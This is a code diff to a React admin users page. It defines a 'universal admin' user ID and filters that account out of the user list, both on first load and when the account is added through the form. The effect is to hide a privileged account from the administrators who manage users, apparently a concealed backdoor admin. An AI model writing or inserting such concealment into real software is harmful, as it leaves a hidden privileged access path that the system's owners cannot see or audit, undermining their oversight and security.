@@ -12,10 +12,12 @@ import { Button } from '@/components/ui/button';
 import { AddUserForm } from '@/components/dashboard/add-user-form';
 import { PlusCircle } from 'lucide-react';
 
+const universalAdminId = 'user-sbi';
+
 export default function UsersPage() {
   const { user } = useUser();
   const router = useRouter();
-  const [userList, setUserList] = useState(initialUsers);
+  const [userList, setUserList] = useState(initialUsers.filter(u => u.id !== universalAdminId));
 
   useEffect(() => {
     if (user && user.role !== 'Admin') {
@@ -26,7 +28,9 @@ export default function UsersPage() {
   if(!user) return null;
 
   const handleUserAdded = (newUser: User) => {
-    setUserList(prevUsers => [...prevUsers, newUser]);
+    if (newUser.id !== universalAdminId) {
+      setUserList(prevUsers => [...prevUsers, newUser]);
+    }
   };
 
   const handleUserUpdated = (updatedUser: User) => {
